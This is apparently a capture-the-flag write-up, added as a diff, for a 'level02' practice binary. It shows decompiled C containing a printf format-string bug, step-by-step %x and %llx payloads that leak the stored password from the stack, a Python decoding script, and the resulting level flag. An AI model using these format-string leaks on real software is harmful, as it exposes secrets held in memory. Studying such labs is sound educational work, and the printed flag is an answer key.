@@ -1,0 +1,138 @@
+# level02
+
+## Testing the binary
+
+```sh
+$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: asd
+--[ Password: asd
+*****************************************
+asd does not have access!
+$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
+--[ Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+*****************************************
+QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ does not have access!
+```
+
+So we're greeted with a cool ASCII art and a login prompt. It doesn't seem to have any buffer overflow, so I guess I'll have to find the username and password.
+
+## Disassembly
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(void)
+{
+    size_t read_bytes;
+    char password[100] = {0};
+    char pass_content[41] = {0};
+    char username[100] = {0};
+    FILE *password_file = NULL;
+    
+    password_file = fopen("/home/users/level03/.pass","r");
+    if (password_file == NULL) {
+        fwrite("ERROR: failed to open password file\n",1,36,stderr);
+        exit(1);
+    }
+    read_bytes = fread(pass_content, 1, 41, password_file);
+    read_bytes = strcspn(pass_content,"\n");
+    pass_content[read_bytes] = '\0';
+    if (read_bytes != 41) {
+        fwrite("ERROR: failed to read password file\n", 1, 36,stderr);
+        fwrite("ERROR: failed to read password file\n", 1, 36,stderr);
+        exit(1);
+    }
+    fclose(password_file);
+    puts("===== [ Secure Access System v1.0 ] =====");
+    puts("/***************************************\\");
+    puts("| You must login to access this system. |");
+    puts("\\**************************************/");
+    printf("--[ Username: ");
+    fgets(username, 100, stdin);
+    read_bytes = strcspn(username,"\n");
+    username[read_bytes] = '\0';
+    printf("--[ Password: ");
+    fgets(password, 100, stdin);
+    read_bytes = strcspn(password, "\n");
+    password[read_bytes] = '\0';
+    puts("*****************************************");
+    if (strncmp(pass_content, password, 41) == 0) {
+        printf("Greetings, %s!\n", username);
+        system("/bin/sh");
+        return 0;
+    }
+    printf(username);
+    puts(" does not have access!");
+    exit(1);
+}
+```
+
+So as we can see [here](source#L45), there's a call to `printf` without any arguments, which could lead to a format string vulnerability.
+
+```sh
+$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
+--[ Password: a
+*****************************************
+ffffe500 0 61 2a2a2a2a 2a2a2a2a ffffe6f8 f7ff9a08 61 0 0 0 0 0 0 0 0 0 0 0 0 0 34376848 61733951 574e6758 6e475873 664b394d 0 25207825 does not have access!
+```
+
+And indeed, we can see that the stack is being printed out.
+
+## Exploitation
+
+And as you can see, in the output we have `25207825` which corresponds to `% x%`, it corresponds to the 27th `%x` in the format string. So we can use this to leak the password.
+
+In [the decompiled code](source) the `pass_content` (that holds the flag) is between `password` and `username`.
+
+```
+61 0 0 0 0 0 0 0 0 0 0 0 0 0 34376848 61733951 574e6758 6e475873 664b394d 0 25207825
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ ^^^^^^^^
+password                     pass_content                                   username
+```
+or translated to ascii
+```
+a            47hHas9QWNgXnGXsfK9M % x%
+```
+
+Since we're in a 64-bit binary, we need to use `%llx` to leak the entire `pass_content` buffer. It is at offset 22, and is 40 bytes long.
+
+`40 / 8 = 5` so we need to leak 5 addresses.
+
+```sh
+$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: %22$llx %23$llx %24$llx %25$llx %26$llx
+--[ Password: a
+*****************************************
+756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d does not have access!
+```
+
+```py
+import struct
+xs = [0x756e505234376848, 0x45414a3561733951, 0x377a7143574e6758, 0x354a35686e475873, 0x48336750664b394d]
+output = ""
+for x in xs:
+    output += struct.pack("<Q", x) # little endian
+print output
+```
+
+This script will output the flag : `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`
